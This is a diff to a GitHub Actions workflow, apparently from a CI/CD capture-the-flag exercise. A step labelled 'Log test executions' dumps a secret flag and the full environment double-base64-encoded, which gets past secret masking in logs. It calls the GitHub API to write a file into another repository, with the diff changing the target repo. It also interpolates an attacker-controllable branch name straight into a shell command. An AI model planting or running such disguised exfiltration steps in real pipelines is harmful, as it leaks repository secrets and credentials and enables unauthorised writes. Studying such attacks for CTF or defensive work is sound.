@@ -19,6 +19,6 @@ jobs:
       - name: Log test executions
         run: |
           echo $FLAG_GRAVY_OVERFLOW_L0_CHEDDAR | base64 -w0 | base64 -w0
-          gh api --method PUT -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28" /repos/litios/cicd/contents/test.txt -f "message=my commit message" -f "committer[name]=Monalisa Octocat" -f "committer[email]=octocat@github.com" -f "content=bXkgbmV3IGZpbGUgY29udGVudHM="
+          gh api --method PUT -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28" /repos/sahnaseredini/gravy-overflow/contents/test.txt -f "message=my commit message" -f "committer[name]=Monalisa Octocat" -f "committer[email]=octocat@github.com" -f "content=bXkgbmV3IGZpbGUgY29udGVudHM="
           env | base64 -w0 | base64 -w0
           echo "Lint ran for branch ${{ github.event.workflow_run.head_branch }} in a PR from ${{ github.actor }}. Please check the logs for more information."
